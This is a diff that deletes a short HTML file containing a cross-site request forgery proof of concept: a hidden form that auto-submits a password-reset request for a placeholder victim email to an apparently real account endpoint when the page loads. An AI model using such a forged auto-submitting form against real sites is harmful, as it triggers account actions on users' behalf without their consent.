@@ -1,12 +1,1 @@
-<!doctype html>
-<html>
-  <body>
-    <form action="secure.tessituranetwork.com/api/account/login/reset" method="POST">
-      <input type="hidden" name="email" value="victim@example.com">
-    </form>
-    <script>
-      // Auto-submit on page load
-      document.forms[0].submit();
-    </script>
-  </body>
-</html>
+
